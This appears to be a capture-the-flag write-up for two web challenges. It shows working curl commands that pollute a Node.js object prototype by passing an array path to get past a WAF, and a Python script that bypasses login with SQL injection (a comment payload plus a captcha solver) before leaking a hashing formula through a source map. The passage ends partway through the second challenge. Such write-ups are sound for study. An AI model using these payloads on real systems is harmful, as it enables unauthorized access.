1. Web Exploitation: Spectral Override

Challenge Overview
Target: http://65.1.162.7/ • Technology Stack: Node.js Express, Nginx reverse proxy.
Vulnerability: Server-Side Prototype Pollution with Web Application Firewall (WAF) filtering. Bypassing string-based WAF checks via JSON array path structures allows elevating privileges to obtain the flag from the secure vault.

Phase 1: Service Reconnaissance & Authentication

Initial enumeration confirmed an Express application titled HEX_09 // CYBER_GATEWAY. Directory fuzzing revealed endpoints /dashboard.html and /api/login. Authenticating with default guest credentials (guest / guest) issued an HTTPOnly session cookie PP_NODE: 

curl -s -c cookies.txt -b cookies.txt http://65.1.162.7/api/login \
  -X POST -H "Content-Type: application/json" \
  -d '{"username": "guest", "password": "guest"}'
Figure 1.1: Target banner inspection showing Express headers and initial session configuration.

Phase 2: Dashboard Analysis & API Endpoints

Accessing dashboard.html using the session cookie exposed an operator console (HOST: CORP-GATEWAY-09, SESSION: GUEST_PRIVILEGES). Source code inspection revealed two critical internal API endpoints:

  • POST /api/update: Accepts JSON payloads (path, value) to dynamically mutate runtime configuration.
  • GET /api/flag: Checks for elevated global administrator privileges (isAdmin) before returning the flag.
Figure 1.2: Inspection of /api/update and /api/flag endpoints in the authenticated dashboard.

Phase 3: WAF Filtering & Prototype Pollution Testing

Testing direct Prototype Pollution on /api/update with standard string paths triggered strict WAF rules: 

# Attempting string-based prototype manipulation:
curl -s -b cookies.txt -X POST http://65.1.162.7/api/update \
  -H "Content-Type: application/json" \
  -d '{"path": "_proto_.isAdmin", "value": true}'

# Response:
{"error":"WAF ALERT: Malicious prototype manipulation blocked."}
Figure 1.3: WAF filtering active against standard dot-separated prototype strings.

Phase 4: WAF Filter Bypass via Array Path Mutation

The backend object path parser supports key traversal represented either as dot-separated strings or JSON arrays. The regex inspection only inspected string inputs for _proto_ and constructor, but did not match on an array structure.

By supplying the path as an array: ["__proto__", "isAdmin"], the WAF was completely bypassed while the backend recursively merged the property onto Object.prototype: 

# WAF Bypass Payload:
curl -s -b cookies.txt -X POST http://65.1.162.7/api/update \
  -H "Content-Type: application/json" \
  -d '{"path": ["__proto__", "isAdmin"], "value": true}'

# Response:
{"success":true, "message":"Configuration merged successfully."}

Phase 5: Flag Retrieval

With Object.prototype.isAdmin = true established in server memory, querying /api/flag satisfied the global administrator check: 

curl -s -b cookies.txt http://65.1.162.7/api/flag
# Output:
{ "flag": "IATCQ{LF6BNCR2VNUORIFD7CMMSVQBCO}" }

2. Web Exploitation: Asterion Group Portal

Challenge Overview
Target: http://13.201.205.33/ • Multi-stage attack chain: Client-side regex bypass, SQL Injection authentication bypass, JavaScript source map discovery, IDOR hash reversal, and Steganographic evidence extraction.

Step 1: SQL Injection Authentication Bypass

The employee portal (login.php) enforced a client-side regex pattern="[A-Za-z0-9_]+" and an arithmetic captcha. Sending direct HTTP POST requests bypassed the client filter. Supplying an inline SQL comment allowed logging in without a valid password: 

python3 -c "
import requests, re
s = requests.Session()
r = s.get('http://13.201.205.33/login.php')
a, b = map(int, re.search(r'(\d+)\s*\+\s*(\d+)\s*=\s*\?', r.text).groups())
payload = {'username': \"priya.sharma' -- -\", 'password': 'x', 'captcha': str(a + b)}
res = s.post('http://13.201.205.33/login.php', data=payload, allow_redirects=False)
print('Redirect:', res.headers.get('Location'))
"
# Redirects to: dashboard.php?id=ac662960d5e262cfd3400bf35ce4813b (HR Manager Priya Sharma)

Intermediate marker discovered in HTML: flag{people_first_access}.

Step 2: Source Map Extraction & Deterministic Hash Reversal

The directory table listed suspended employee Arjun Mehta (Case HR-017). Fetching the JavaScript source map http://13.201.205.33/js/employee-directory.js.map leaked the internal TypeScript ID formula: 

export function createPersonnelLink(employee) {
  const prefix = employee.firstName.slice(0, 3).toLowerCase();
  const month = String(employee.birthMonth).padStart(2, '0');
  const joined = employee.joiningDate.replaceAll('-', '');
  return md5(prefix + month + joined);
}

Intermediate marker in source map: flag{deterministic_links_are_safe}.
